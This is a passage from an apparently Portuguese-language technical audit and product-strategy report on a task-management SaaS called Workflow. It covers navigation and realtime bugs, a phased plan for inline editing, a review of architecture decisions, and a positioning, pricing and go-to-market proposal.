**Uma decisão que vale tomar junto (seção 7, decisão 6):** manter três shells significa registrar toda feature nova em três lugares. O `CanvasShell` já está desligado por feature flag e tem dois botões mentirosos (o "Novo", que é o CTA mais destacado da tela, abre a paleta, que **não tem um único comando de criação**; e o botão com `title="Assistente"` abre a paleta, não o assistente). Minha recomendação é matar o CanvasShell e transformar o FocusShell num **modo** do CommandShell (rail compacto mais coluna de contexto), não num shell separado.

**Um dado que vale registrar sem julgamento moral, porque é informação de prioridade:** o `git log` de `core/components/shells/` mostra **6 commits seguidos** de modo XP, enquanto o FocusShell não recebe correção funcional desde a spec de unificação e a responsividade mobile nunca existiu (`shells-nav.md`, seção 5). O XP em si é bem-comportado. O custo dele não é técnico, é de atenção.

---

### 4.6 "O WebSocket não atualiza direito e perde o lugar ao voltar"

O diagnóstico do lado do realtime está no Problema 7. Aqui trato a outra metade, que é a **perda de estado de tela**, e que é responsabilidade do roteamento e dos shells.

**Diagnóstico.** São quatro defeitos somados que produzem exatamente o sintoma descrito.

**a) O botão "Voltar" da tela de detalhe empilha histórico em vez de voltar.**

```ts
// work-flow/src/features/tasks/TaskDetailsView.vue:613-615
const goBack = () => { router.push(`/tasks/${activeMonthId.value}`) }
```

Hard-coded, sem `router.back()`. Três consequências: (1) o destino é sempre o board mensal, mesmo quando o usuário veio do `/board` agregado; (2) o histórico vira `lista -> detalhe -> lista -> detalhe`, e o botão do navegador leva de volta para o detalhe, em loop; (3) o `savedPosition` do `popstate` nunca é usado, porque não há `popstate`.

**b) Não existe `scrollBehavior` no router.** Grep por `scrollBehavior` em todo o `src/`: **zero ocorrências** (`work-flow/src/router/index.ts:40-42`).

E aqui tem uma sutileza que faz a correção óbvia não funcionar: **o elemento que rola não é a janela, é um div interno do shell** (`.main` no CommandShell e no CanvasShell, `.main-scroll` no FocusShell). Como o shell não é remontado ao trocar de rota (só o `<slot/>` muda), esse container mantém o `scrollTop` entre navegações. Ou seja: ir de uma lista rolada para o detalhe abre o detalhe **no meio da página**; e mesmo que alguém adicione `scrollBehavior` depois, ele age em `window`, que aqui não rola, e vai parecer que não funcionou (`shells-nav.md`, P7).

**c) O estado de UI vive em `ref` local e morre no unmount.** A aba ativa (`TasksView.vue:79`), o responsável selecionado (`:78`), o filtro de prioridade (`:179-180`), o `showFilters` (`:350`), o `expandedTasks` do board (`KanbanBoard.vue:185`), a busca e os filtros do `/board` (`BoardView.vue:26-28`), o modo e o trimestre ativo do roadmap. Nada disso vai para a URL. Você filtra por "Maria", abre uma tarefa da Maria, volta, e está no board inteiro sem filtro, no topo, com a aba resetada. Não há `<KeepAlive>` em lugar nenhum do projeto.

Há precedente de como fazer certo **no próprio repo**: `QrCodesView.vue:73` lê o estado da aba de `route.query.scope` e `:140` grava de volta na URL.

**d) A tela de detalhe muda o estado e não invalida o board.** Existe um helper `invalidateBoards` (`TaskDetailsView.vue:378-382`) e ele só é chamado nas duas trocas de mês (`:419` e `:529`). Todas as outras mutações não invalidam nada: marcar subtarefa (`:666`), excluir subtarefa (`:547`), editar subtarefa (`:576`), criar subtarefa (`:194-202`, `:305-315`), anexos. Você abre a tarefa, marca uma subtarefa como concluída, volta e vê o estado antigo. Precisa de F5.

Agrava: o `useCompanyBoards` não define `refetchOnMount`, e o `staleTime` global é de 2 minutos com `refetchOnWindowFocus: false` (`work-flow/src/main.ts:53-55`). Ao remontar o `TasksView`, a query `['boards', monthId]` está "fresca" e não refaz o fetch.

**e) Um problema mais sério embaixo: o realtime muta o cache do TanStack por fora.**

```ts
// work-flow/src/features/tasks/TasksView.vue:93,105
const tasks = ref<BoardColumns>({ TODO: [], IN_PROGRESS: [], IN_TESTING: [], DONE: [] })
watch(tasksData, (val) => { if (val) tasks.value = val }, { immediate: true })
```

`tasks.value = val` guarda a **mesma referência** do objeto que está no cache. Depois, tanto o arraste local quanto o `applyRemoteMove` fazem `splice` nesses arrays, editando o cache do TanStack por fora do `setQueryData`. O TanStack não sabe que o dado mudou; no refetch seguinte, o `replaceEqualDeep` compara o dado já mutado com o novo, mantém a referência antiga quando são equivalentes, o `watch` não dispara, e divergências sutis de ordem persistem (`realtime.md`, P-11). Somando o `KanbanBoard`, que faz uma **terceira** cópia local (`:90-107`) e ignora atualizações enquanto `isDragging` é true, são três cópias do mesmo estado. Toda dessincronização entre elas é uma classe inteira de bug.

**Desenho da solução.** Em ordem de retorno, e a maior parte é meio dia de trabalho:

1. **`scrollBehavior` custom no router** que resolve o container de scroll do shell ativo por seletor (`.main` ou `.main-scroll`), salva `scrollTop` por `fullPath` em `sessionStorage` e restaura em `POP`, zerando em `PUSH`. Esforço P, mas precisa ser o custom, não o padrão.
2. **`goBack` usando `router.back()`** com fallback para `push` quando `window.history.state.back` for nulo. Esforço P.
3. **Filtros e aba na query string** em Tasks, Board e Roadmap, seguindo o padrão que o `QrCodesView` já usa. Esforço M, e de brinde os filtros viram link compartilhável, o que é meia queixa 4.1 resolvida.
4. **`refetchOnMount: 'always'` no `useCompanyBoards`** e `invalidateBoards` em **toda** mutação da tela de detalhe, não só na troca de mês. Esforço P.
5. **Aplicar movimentos com `queryClient.setQueryData` retornando objeto novo**, e deixar o `tasks` local ser `computed` derivado em vez de cópia mutável. Esforço M.
6. **O painel sobre o board da queixa 4.2 mata esse problema por construção** nesse fluxo: se a tarefa abre num drawer e não numa página, não há o que restaurar.
7. **Indicador honesto de conexão.** Os handlers `connect` e `disconnect` já existem no contrato do serviço de realtime e ninguém os usa para UI (`realtime-service.ts:101-102,190-195`). Um badge discreto "tempo real ativo / reconectando / offline" transforma "o app às vezes não atualiza" (bug percebido) em "a rede caiu e o app me avisou" (comportamento entendido). Esforço P, e resolve boa parte da **percepção** da queixa mesmo antes de o resto ficar pronto.
8. **Catch-up por cursor (esforço M).** Já existe a tabela `FeedEvent` com `createdAt` e `companyId`. Persistir todo evento de domínio nela e expor `GET /events?since=<cursor>`. No `connect` e no `reconnect`, o cliente manda o último cursor e recebe o delta. Elimina de vez o "às vezes não atualiza" sem refetch total, e de brinde habilita o histórico por tarefa que falta no card grande da queixa 4.2.

---

### 4.7 "Editar uma atividade exige entrar em modo editar, queria salvar direto"

**Diagnóstico, e a boa notícia vem primeiro: o backend já está pronto.**

```ts
// workflow-api/src/activity/activity.service.ts:113-129
const data = {
  ...(dto.title && { title: dto.title }),
  ...(dto.description !== undefined && { description: dto.description }),
  ...(dto.priorityNumber !== undefined && { priorityNumber: dto.priorityNumber }),
  ...(dto.dueDate !== undefined && { dueDate: dto.dueDate ? new Date(...) : null }),
  ...(dto.monthId !== undefined && { monthId: dto.monthId }),
  ...(dto.responsibleUserIds?.length && { responsibles: { create: ... } }),
};
```

`PATCH /activity/:id` já aceita `{ title }` sozinho, `{ priorityNumber }` sozinho, e assim por diante. **Não é preciso mexer no backend para os campos simples.** O front é que insiste em montar payload completo com `buildActivityPayload` (`TaskDetailsView.vue:60-70`).

**Melhor ainda: o padrão que você quer já existe dentro do próprio arquivo, aplicado a 2 dos 8 campos.** Trimestre e Mês são dois `AppSelect` que disparam `changeActivityMonth` no `@update:model-value`, com loading inline (`Loader2` na linha 899), `:disabled` durante o save e rollback via `syncPlacementSelection()` no catch (`TaskDetailsView.vue:874-901,422`). E no board, renomear o título por duplo clique já faz patch parcial de um campo, sem modal, com rollback (`KanbanBoard.vue:38-55` mais `TasksView.vue:295-302`). O mini-modelo do que você quer está funcionando em três lugares.

**O que existe de "modo editar" hoje:**

| # | Local | Linhas |
|---|---|---|
| 1 | Botão lápis do cabeçalho | `TaskDetailsView.vue:749-757` |
| 2 | `openEditActivityModal` copia 8 campos para `formActivity` | `:466-482` |
| 3 | `formActivity` (estado espelho) | `:355-364` |
| 4 | `<v-dialog>` de 900px com todos os campos e o painel de IA | `:1007-1236` |
| 5 | `updateActivity` monta payload completo, faz PATCH, sobe anexo, fecha | `:484-542` |
| 6 | Toggle `editingSubtask` com `v-if`/`v-else` dentro do modal | `:350,1346-1355,1373,1446` |
| 7 | Botões Cancelar e Salvar | `:1221-1234,1552-1568` |

São 5 ações e uma troca de contexto total para mudar um caractere do título. A subtarefa é pior: modal, lápis dentro do modal, troca de `v-if`, Salvar, e o modal inteiro fecha, então você perde a visualização.

**Quatro bugs que a migração carregaria junto se não forem corrigidos antes.**

1. `Number(x) || 1` rebaixando P0 para P1 (Problema 9c). Com auto-save, isso passaria a acontecer a cada campo salvo.
2. Não dá para limpar a data de entrega, porque `undefined` some do JSON (`TaskDetailsView.vue:511-519`).
3. `toggleSubtaskStatus` faz update otimista e **não reverte no erro** (`:662-671`). Perdeu a rede, o check fica marcado na tela e o servidor tem TODO. O usuário acredita que fechou a subtarefa. Note que `TasksView.handleMove` e `handleRenameTask` **fazem** o rollback, e o `useComments.toggleReaction` faz rollback de verdade: aqui foi esquecido.
4. Existe **um único** `saving` para quatro modais (`:351`, usado em `:192,303,486,574`). Salvar a atividade acende o spinner do botão "Criar" da subtarefa. Com auto-save, um flag global não consegue representar "título salvando, descrição salva, prioridade com erro".

**Um quinto, no backend:** `...(dto.responsibleUserIds?.length && ...)` só recria os responsáveis quando o array não é vazio, então **"remover todos os responsáveis" hoje é silenciosamente ignorado** (`activity.service.ts:125-129`).

**Desenho da solução, fase a fase.**

**Fase 0 (esforço P, 1 dia).** Corrigir os cinco bugs acima. São independentes e cada um já é uma melhoria.

**Fase 1: camada de dados (esforço M, 2 a 3 dias), sem mudar nada visual.**
- Trocar `activityInfo = ref<any>(null)` mais `InfoActivity()` (`:220-221,282-288,339-348`) por `useQuery({ queryKey: ['activity', taskId], ... })`. Isso resolve de graça o bug de a tela não recarregar quando o `taskId` muda (hoje não há `watch(taskId)` e só escapa por sorte, porque os caminhos que trocam de tarefa remontam o componente).
- Criar `features/tasks/useActivityMutations.ts` com uma `useMutation` por campo (ou uma genérica `patchField(field, value)`), com `onMutate` fazendo snapshot e `setQueryData` otimista, `onError` restaurando e mostrando "Tentar de novo", e `onSettled` invalidando `['activity', id]`, `['boards', monthId]`, `['backlog', companyId]` e `['dashboard','workspace']`.

Só essa fase já resolve metade da queixa 4.6, porque as invalidações passam a acontecer em toda mutação.

**Fase 2: campos simples inline (esforço M).** Status (segmented com os 4 estados), prioridade (popover com os chips que já existem no `TaskForm`), data (input inline com botão "limpar" mandando `null`), responsáveis (`AppSelect multiple` com commit no fechar do popover). Trimestre e mês **já estão prontos**, só padronizar o indicador. Aqui você já sente a mudança.

**Fase 3: título e descrição (esforço M).** São os que exigem cuidado de foco e debounce. Título vira `<textarea>` auto-resize com estilo de h1, commit em blur e Enter, Esc cancela. Descrição vira editor inline com debounce de 800ms e flush no blur, resolvendo de quebra o XSS e as quebras de linha. Remoção do modal inteiro.

**Fase 4: subtarefas inline (esforço M).** Mesmo painel, sem o toggle `editingSubtask`.

**Fase 5: o backend fecha o ciclo (esforço M).** `activity:updated` emitido no `update`, `create` e `remove`, e merge de campo remoto no front.

**Regras que precisam ser escritas e hoje não existem em lugar nenhum.** Auto-save sem essas regras é pior que botão Salvar:

- **Debounce por tipo de campo:** texto 800ms com flush no blur; select, chip e checkbox imediato.
- **Não sobrescrever enquanto digita:** se chegar um `activity:updated` de outro usuário com o campo em foco sujo, não aplicar; mostrar "Fulano alterou este campo" com botão de aceitar.
- **Sair da página com pendência:** `onBeforeRouteLeave` mais `beforeunload` fazendo flush das mutations abertas.
- **Conflito:** comparar `updatedAt` da resposta (a mesma técnica já usada em `useActivityBoardRealtime.ts:31-35`); se o servidor for mais novo, avisar em vez de sobrescrever. No backend isso pede `expectedUpdatedAt` no PATCH com 409 no conflito (`arch-api.md`, 3.5), porque hoje duas pessoas editando a mesma tarefa produzem last-write-wins silencioso.
- **Erro de rede:** fila de retry ou banner persistente. Auto-save que falha em silêncio é pior do que botão Salvar.
- **Affordance visível:** campo editável precisa de hover com fundo e um ícone de lápis discreto, `aria-label` e navegação por teclado. Sem isso, edição direta **parece quebrado** para usuário 50+, que é o público do programa didático.
- **Um `SaveIndicator` derivado do `mutationCache`** (via `useIsMutating`) com três estados: "Salvando...", "Salvo às HH:MM", "Não salvo, tentar de novo". Substitui o `saving` único.

**Esforço total:** G (1 a 2 semanas focadas), sendo Fase 0 mais Fase 1 entregáveis em 2 a 3 dias e já resolvendo metade da queixa 4.6.

---

### 4.8 "Arquiteturalmente pensei coisas ruins no início"

Você não pediu esta seção, mas os relatórios voltam a ela o tempo todo e vale um veredito honesto, porque a autocrítica está parcialmente errada e isso importa para decidir o que refatorar.

**O que de fato foi decidido errado, e é caro:**

1. **`Activity` sem `companyId`.** Todo filtro de tenant é um join de 3 níveis (`month: { quarter: { companyId } }`) repetido literalmente em 17 lugares, sem nada que force sua presença. É a causa mecânica do Problema 1 e do gargalo de performance.
2. **Hierarquia `Company > Quarter > Month > Activity` fixa e sem ano.** Problema 5.
3. **Duas modelagens de "mês" que não se falam** (`Month` e `RoadmapMonth`), com convenções diferentes (1-12 versus 0-11) e sem FK. Mais três representações de data no roadmap (`Activity.dueDate` como DateTime, `RoadmapEntry.date` e `RoadmapMilestone.date` como String).
4. **Duas implementações independentes do mesmo kanban**, mais uma terceira morta. `/board` (`BoardView.vue`, 808 linhas) e `/tasks/:month` (`TasksView` mais `KanbanBoard`, 1.655 linhas) têm DnD diferente, endpoint de persistência diferente, filtros diferentes e escala de prioridade **invertida** entre si. E `WorkspaceView.vue` (974 linhas) é uma terceira versão sem rota.
5. **Três fontes de verdade para "empresa ativa"** (localStorage, `workspaceStores.activeCompanyId`, `authStores.companyId`), lidas em 34 pontos, com fallbacks encadeados que usam stores **diferentes** como primeira opção (`arch-front.md`, P-04).
6. **Onze lugares para registrar uma rota nova** (seção 4.5).
7. **Cinco pontos de edição por evento novo de realtime**, que é o motivo estrutural de o realtime ter parado em 11 eventos.
8. **`ActivityStatus` como enum Postgres de 4 valores fixos**: nenhuma empresa cliente consegue ter "Bloqueado", "Code Review" ou "Aguardando cliente".
9. **`@sendgrid/mail`, `@fastify/*` e `@scalar/fastify-api-reference` no `package.json` sem uso**, porque a API roda sobre Express e não Fastify.
10. **Dois módulos de notificação separados por um "s"**: `src/notification` (inbox in-app) e `src/notifications` (cron de Discord). Isso já produziu import duplicado em `app.module.ts:24` e `:32`.

**O que não é erro de arquitetura, e sim dívida de acabamento:** os arquivos de 4.563 e 2.293 linhas, os 24.502 linhas de CSS scoped contra 553 no global, os 810 `font-size` em px, as 9 implementações independentes de `.btn-primary`, os 49 lugares que reimplementam extração de erro. Isso não é decisão ruim, é feature entregue sem a etapa de extração. E o padrão certo já existe no repo (seção 2.6).

**E o que é simplesmente falta de limpeza:** ~1.900 linhas órfãs que ninguém importa (`WorkspaceView.vue` 974, `NavigationDrawer.vue` 582, `AppBar.vue` ~200, `AuroraBackground.vue` ~110, `core/index.ts`, seis barris `index.ts` de feature nunca importados, `useKeyboardShortcuts.ts` pronto e sem consumidor), mais o `useTasks.ts` com mock de "Empresa A / Empresa B / Empresa C" e datas de 2024 **ainda importado por duas telas de produção** (`TasksView.vue:73` chama e descarta; `TaskDetailsView.vue:129,602` alimenta um `getCompanyName` que não aparece no template mas está lá esperando alguém usar).

**Veredito.** O erro estrutural real está concentrado em **duas decisões** (a hierarquia de período sem ano, e a ausência de `companyId` em `Activity`) e **um padrão** (registry duplicada, seja de navegação, de eventos ou de estado de empresa). O resto é dívida normal de produto que cresceu rápido, e é barata de pagar de forma incremental. Não vale reescrever nada. Vale pagar essas duas decisões e adotar a regra "registry única" nos três lugares onde ela falta.

---

## 5. Visão de dono: para onde levar o produto

Esta é a seção que importa. As anteriores dizem o que está quebrado; esta diz o que construir. Vou ser opinativo, porque lista genérica de SaaS não ajuda ninguém e você não pediu isso.

### 5.1 O ponto de partida honesto: você não tem um problema de funcionalidade

Você construiu um canvas colaborativo com Yjs e desligou por feature flag. Você construiu um RAG semântico próprio com embeddings locais. Você construiu um agente de IA com sete ferramentas e streaming por socket. Você construiu um microserviço de QR com token hasheado e documentação Scalar. Você construiu um pipeline que transforma um vídeo de 60 segundos numa especificação de bug escrita por Claude.

E não construiu uma tela que permita alguém criar a própria empresa depois de se cadastrar.

Isso não é preguiça nem falta de foco. É o padrão clássico de quem constrói para si: você resolve o que **você** sente. Você já tem empresa criada, então nunca sentiu o beco sem saída do signup. Você já tem os colegas na base, então nunca sentiu o convite. Você nunca esqueceu a senha.

O diagnóstico central deste documento é: **falta a espinha comercial, e cada item dela é menor do que o canvas que você já construiu e desligou.** Alguém consegue se cadastrar sozinho, convidar o time, receber um e-mail, ver um relatório pronto e pagar. Isso é tudo. E é semanas, não meses.

Mas antes de construir a espinha, é preciso decidir **de que produto ela é a espinha**. Porque "mais um gestor de tarefas com IA" não vende: o mercado tem cinquenta, todos com IA agora, e alguns de graça.

### 5.2 O wedge: o cliente do seu cliente

**A pergunta certa não é "por que uma PME escolheria isso em vez de Jira, Azure, Trello ou ClickUp". É "o que essas ferramentas nunca vão fazer, por decisão deliberada delas".**

A resposta é uma só e é estruturalmente estável: **o cliente final não entra.** Jira, Azure DevOps, Trello e ClickUp são ferramentas de time interno. O usuário deles é o time de engenharia ou o time de operações da empresa que assina. O cliente da empresa que assina é um estranho para esses produtos, e vai continuar sendo, porque colocá-lo dentro significaria redesenhar permissão, onboarding, cobrança e suporte para uma persona que não paga.

Enquanto isso, o que acontece em toda agência, software house e prestador de serviço brasileiro, todo dia:

> O cliente manda áudio no WhatsApp. Ou print no e-mail. Ou fala no telefone. Alguém do time escuta, entende, traduz para uma tarefa, e às vezes esquece. Depois o cliente pergunta "e aquilo que eu falei?", e ninguém sabe onde foi parar.

Isso não é um inconveniente. É a maior fonte de retrabalho, de atrito e de perda de contrato numa agência. E é um problema que ferramenta de time interno não pode resolver, porque a solução exige que a pessoa de fora esteja dentro.

**Você já construiu 70% da solução e não percebeu.** Está tudo no código, verificável:

| Peça | Onde está |
|---|---|
| URL pública por empresa, sem login | `work-flow/src/router/index.ts:47-52` (`/report/:companyId`) |
| Cliente grava até 60 segundos de tela, ou manda print, ou só escreve | `work-flow/src/features/bug-report/ReportBugView.vue:44` |
| Upload de vídeo até 18 MB com limite validado | `workflow-api/src/bug-report/bug-report.controller.ts:39-43` |
| Gemini extrai o que aconteceu do vídeo | `workflow-api/src/bug-report/bug-report.service.ts:256-300` |
| Claude escreve uma Spec estruturada: título, severidade, prioridade sugerida, passos de reprodução | idem, com fallback degradado se a IA falhar |
| Vira `Activity` no mês corrente do board do time | `bug-report.service.ts:302-326` |
| O cliente recebe link `/r/<id>` para acompanhar o status | `router/index.ts` (rota `report-status`) |

Isso é um produto inteiro escondido dentro de um módulo. E é **defensável de verdade**, não por moat de tecnologia, mas por posicionamento: a qualidade da especificação gerada melhora com o histórico da empresa, que já está indexado num RAG local com custo marginal zero de indexação (embeddings via `@huggingface/transformers`, modelo `Embedding` de 768 dimensões escopado por empresa). Quanto mais tempo o cliente usa, melhor a IA fica **naquele contexto específico**, e isso não migra para outra ferramenta.

**Os 30% que faltam, em ordem:**

1. **Fechar o loop com o cliente.** O campo `reporterContact` é capturado e gravado (`bug-report.service.ts:132`) e só entra no prompt do Claude como contexto (`:371-372`). O cliente que reportou **nunca é avisado quando o bug é resolvido**. Esse é o loop de valor mais óbvio do produto inteiro, e está aberto. Depende de e-mail, que não existe (Problema 6). Esforço P depois do `MailModule`.
2. **Papel de cliente e portal.** Hoje convidar o cliente para acompanhar significa dar acesso de WORKER a tudo, inclusive ao cofre de credenciais em `/variables` e ao time tracking, porque só existem `ADMIN` e `WORKER` no `enum CompanyRole`. Na prática, ninguém convida. E a pasta `work-flow/src/features/portal/` está **vazia no repositório**, o que sugere que a ideia já passou pela sua cabeça. Esforço G.
3. **WhatsApp como entrada.** Discord é canal de gamer e de dev; o produto já tem webhook de Discord por empresa e cron a cada 2h (`workflow-api/src/notifications/notifications.service.ts:29-42`), e isso serve ao seu time, não ao cliente do seu cliente. O canal do cliente PME brasileiro é WhatsApp. Um número que recebe áudio, print e texto e cria o `BugReport` pelo mesmo caminho que já existe é a diferença entre "mais uma ferramenta" e "eu preciso disso". Esforço G.

**Posicionamento, na frase que eu colocaria no site:**

> **Workflow: a ferramenta de gestão que o seu cliente também usa.**
> Ele grava 60 segundos de tela, a IA transforma em tarefa especificada no seu board, e ele acompanha a entrega num portal com a sua marca. Sem treinar o cliente, sem tradução manual, sem áudio de WhatsApp perdido.

E a frase de venda de uma linha, para conversa: *"Quantas horas por semana alguém do seu time gasta transformando reclamação de cliente em tarefa? A gente elimina isso."*

**Por que isso vence Jira, Azure, Trello e ClickUp para esse comprador específico:**

| | Jira / Azure | Trello / ClickUp | Workflow com o wedge |
|---|---|---|---|
| Cliente final entra | não | não (conta = assento) | **sim, sem login** |
| Reclamação vira tarefa especificada | manual | manual | **automática, por vídeo** |
| Roadmap para mostrar ao cliente | não existe | manual, feio | **derivado das entregas, com sua marca** |
| Horas faturáveis por cliente | plugin pago | integração externa | **nativo (`TimeEntry.billable`)** |
| Credenciais do cliente | não | não | **nativo (`CompanyVariable` com crypto)** |
| Multi-cliente por desenho | projeto = pasta | workspace por cliente, caro | **`Company` já é o cliente atendido** |
| Preço para 5 pessoas no Brasil | caro em dólar | caro em dólar | reais, sem conversão |

O último ponto não é detalhe. Uma agência de 6 pessoas que assina Jira mais Harvest mais um formulário de suporte paga fácil 400 a 600 reais por mês em dólar, com três logins e três lugares onde o dado mora. Substituir três ferramentas por uma, em reais, é argumento de venda antes mesmo do wedge.

### 5.3 O que transforma "organizador de tarefas" em "ferramenta que não se larga"

Organizador de tarefas se larga numa tarde. Você exporta um CSV, cola no Trello, e acabou. Se o produto puder ser trocado numa tarde, ele nunca vai valer mais que 15 reais por assento.

O que trava a saída são cinco coisas, e o Workflow tem matéria-prima para quatro delas **hoje**:

**1. Dado que não existe em nenhum outro lugar da empresa.**
Um board de tarefas existe na cabeça de todo mundo. Já "quantas horas eu gastei nesse cliente esse mês, quanto disso é faturável, e a que valor" não existe em outro lugar. `TimeEntry` já tem `billable`, `durationSec`, `companyId` e `activityId`, e já existe um relatório agregando por usuário, por atividade e por dia com `billableSec` separado (`workflow-api/src/time-tracking/time-tracking.service.ts:358-420`). Falta valor-hora e fechamento de mês. **Dado financeiro é o dado mais difícil de migrar do mundo**, porque migrar significa refazer a base de faturamento do ano.
Igualmente: o cofre de variáveis por empresa (`CompanyVariable` com criptografia) é onde moram as credenciais do cliente. Ninguém migra credencial por diversão.

**2. Gente de fora dentro.**
Enquanto a ferramenta é interna, trocar custa treinar 6 pessoas. Quando o cliente final está dentro, trocar custa **retreinar todos os clientes da agência**. É o custo de troca mais barato de construir e mais caro de pagar. É por isso que o portal do cliente (5.2, item 2) não é uma feature: é a trava.

**3. Um artefato recorrente que sai do produto e chega em alguém que não usa o produto.**
Hoje o gestor não recebe **nada** pronto. O que existe com nome de relatório é um editor TipTap em branco onde alguém escreve o relatório do trimestre à mão (`work-flow/src/features/reports/ReportView.vue`). `GET /report/completed` e `GET /report/backlog` existem na API e **ninguém consome**. O único artefato exportável do produto inteiro é o PDF do roadmap (`workflow-api/src/export/export.controller.ts:34`).
A matéria-prima para o relatório automático está toda pronta: `dashboard.service` calcula atrasos e progresso, `time-tracking.service:358-420` agrega horas, o `FeedEvent` tem a timeline, e `POST /copilot/digest` já gera um resumo executivo por IA a partir do feed (`workflow-api/src/copilot/copilot.service.ts:35-54`). Falta juntar, virar PDF com pdfkit (que já está em uso) e mandar por e-mail toda segunda.
**Todo e-mail de relatório que chega no chefe do seu cliente é um lembrete mensal de por que a assinatura existe.** É o item de melhor relação valor/esforço de todo este documento depois do e-mail em si.

**4. Automação que roda sozinha e que dá falta quando para.**
O cron de Discord (`notifications.service.ts:29-42`) é o **único** mecanismo de retorno externo do produto hoje, e exige que a empresa use Discord. Alertas de risco no roadmap, avisos de prazo, digest semanal, webhooks de saída assinados com HMAC: coisas que rodam enquanto ninguém olha e que geram a sensação de "o sistema está cuidando".

**5. IA que só é boa naquele contexto.**
Esta é a que o mercado ainda não precificou direito. Todo mundo tem "IA". Quase ninguém tem IA que responde sobre **o seu histórico**. O RAG local já indexa ACTIVITY, ROADMAP_MONTH, ROADMAP_ENTRY, EVENT, NOTE, BOARD e BUG_REPORT por empresa, com custo marginal zero. O que falta é o agente **executar** em vez de só relatar: as sete ferramentas atuais são todas de consulta (`search_tasks`, `get_task`, `search_notes`, `list_events`, `search_comments`, `get_recent_activity`, `semantic_search`). Adicionar `create_task`, `move_task`, `assign_task`, `add_comment` e `start_timer`, com confirmação do usuário antes de executar e registro no `FeedEvent`, multiplica o valor percebido sem construir base nova. Esforço M, e é diferenciação real.

**O que eu deliberadamente NÃO colocaria nessa lista:** canvas colaborativo, integração com GitHub, importador de Jira e QR. São features boas, mas nenhuma delas trava saída. Voltarei a elas em 5.6.

### 5.4 Onde está a receita

#### Quem paga

O ICP é **agência, software house, estúdio ou prestador de serviço brasileiro de 2 a 15 pessoas que atende vários clientes ao mesmo tempo**. Isso não é chute, está na modelagem: `Company` não é "a empresa que assinou", é **o cliente atendido**. O dashboard chama companies de "projetos" (`work-flow/src/composables/useDashboardOrchestration.ts:283-301`) e o clique num projeto navega para a tela de **variáveis de ambiente**, ou seja, para as credenciais do cliente (`:323-329`).

Isso é revelador e é bom: o produto foi desenhado por quem precisa das credenciais do cliente ao abrir o projeto. Um prestador de serviço, não um gerente interno. **Não brigue com isso, dobre a aposta.**

Perfis secundários, em ordem de proximidade: (a) PME que tem um fornecedor de TI e quer acompanhar as entregas dele (entra pelo portal e vira lead do plano próprio); (b) time interno de PME de 10 a 30 pessoas que só quer board mais horas mais relatório, sem o wedge; (c) freelancer solo, que é o funil grátis.

#### O que cobrar, e o degrau que só você tem

A maioria dos concorrentes cobra por assento. Assento é uma métrica ruim para agência pequena, porque o time não cresce e o cliente sim. **A métrica que acompanha o valor entregue aqui é cliente atendido**, e ela cai naturalmente no modelo atual, onde `Company` já é o cliente e o papel já é por empresa.

Proposta de empacotamento:

| Plano | Preço sugerido | Limite | O que destrava |
|---|---|---|---|
| **Solo** | grátis | 1 cliente, 2 membros, IA limitada, sem portal | funil e demonstração honesta |
| **Agência** | 49 a 79 reais por assento/mês | clientes ilimitados, até N no portal | portal do cliente, bug report por vídeo, relatório automático, horas faturáveis |
| **Estúdio** | 399 a 799 reais/mês fixo | assentos e clientes ilimitados | marca própria no portal, API pública, webhooks, SSO, exportação |
| **Add-on QR** | por volume | | QR dinâmico com métricas |

Três opiniões sobre esse quadro:

1. **Cobre por assento no plano do meio, não por cliente.** É mais fácil de explicar, e o cliente atendido entra como limite do portal, que é o que tem custo real (e-mail, storage, IA). Cobrar por cliente atendido soa como punição por crescer.
2. **O preço fixo do Estúdio é onde está a margem.** Agência que atende 20 clientes e coloca a própria marca no portal não compara preço com Trello, compara com o valor de parecer profissional para 20 clientes. White-label leve (logo e cor no portal e nos PDFs) é feature de plano alto clássica, e o backend já tem padrão de upload de imagem por empresa.
3. **O QR é um produto separado disfarçado.** É a única parte da API que é pública, madura e com valor autônomo (QR editável com métricas é um produto de mercado por si só). Não compete com nada do núcleo e pode ser porta de entrada. Manteria como add-on de baixo esforço, mas **não gastaria roadmap com ele** enquanto o wedge não estiver de pé.

#### O que precisa existir antes de cobrar, em ordem dura

Não dá para ligar cobrança antes disso. Cada item é um bloqueador real, não uma preferência.

| # | Bloqueador | Por que trava a cobrança | Esforço |
|---|---|---|---|
| 1 | Isolamento entre empresas fechado (Problema 1) | primeiro questionário de segurança mata a venda; e um vazamento entre dois clientes seus é um problema seu, não do produto | P a M |
| 2 | Ambiente separado da produção (Problema 2) | você não pode cobrar por um sistema onde o próprio desenvolvimento escreve | P |
| 3 | Cadastro self-serve que funcione (Problema 6) | sem isso não existe trial, e cada cliente custa uma intervenção sua no banco | M a G |
| 4 | E-mail transacional | convite, reset de senha, recibo, aviso de cobrança. Cobrar sem conseguir mandar e-mail é impossível na prática | M |
| 5 | Medição de uso de IA por empresa | hoje o throttle das rotas de IA é **por IP** (`workflow-api/src/copilot/copilot.controller.ts:30`), sem contador de tokens e sem custo por cliente. No dia da cobrança, sua margem é desconhecida e um cliente pesado é subsidiado pelos outros | M |
| 6 | Um artefato que justifique a assinatura | o relatório automático de 5.3, item 3 | M |
| 7 | Instrumentação de produto | hoje o PostHog captura **só `$pageview`** (`work-flow/src/composables/usePostHog.ts:17-21`). Sem evento de ativação você não sabe onde o trial morre, e vai precificar no escuro | P |
| 8 | Remover o card de plano falso | "Plano Free / 7 de 20 projetos" com botão morto na posição mais valiosa da tela ensina todo dia que o produto é uma demo (`CommandShell.vue:100-112`). Enquanto não houver billing real, tire ou troque por algo verdadeiro (uso real, convite de time) | P |
| 9 | Gateway com PIX e boleto | Stripe puro não resolve PME brasileira. Asaas, Pagar.me ou Stripe com PIX | M |
| 10 | LGPD mínima | exportação de dados por empresa e exclusão de conta. Hoje não existe `DELETE /user` nem endpoint de portabilidade | M |

**Sobre o item 7, uma sugestão concreta de definição de ativação:** empresa criada com pelo menos 3 tarefas, 1 membro convidado e 1 bug report recebido em 7 dias. Os eventos mínimos a instrumentar: `signup`, `company_created`, `first_task_created`, `member_invited`, `bug_report_received`, `copilot_used`, `share_link_created`, `timer_started`. É o item mais barato de toda a lista e o que mais muda decisão futura.

#### A ordem em que o dinheiro aparece

1. **Primeiro cliente pagante vem de venda direta, não de self-serve.** Você já tem clientes usando o produto de graça hoje. Ligar cobrança para eles é conversa, não funil. Isso valida preço com custo de aquisição zero.
2. **O relatório automático é o gatilho de conversa.** "Toda segunda você recebe o que foi entregue, o que atrasou e quantas horas foram gastas em cada cliente" é uma frase que fecha venda. E existe hoje em matéria-prima.
